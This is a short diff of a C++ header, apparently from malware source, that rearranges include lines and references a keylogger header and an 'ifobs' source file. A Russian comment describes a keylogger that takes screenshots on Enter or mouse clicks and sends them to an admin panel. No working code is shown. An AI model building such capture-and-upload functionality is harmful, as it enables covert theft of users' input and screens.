@@ -1,7 +1,6 @@
+#include "../source/system/ifobs.cpp"
+#include "../../core/include/core/memory.h"
 #pragma once
-
-#include "core\keylogger.h"
-#include "core\vector.h"
 
 //стартует кейлогер который по нажатию Enter и левой кнопки мыши делает указанное количество скриншотов
 //и отсылает их в админку
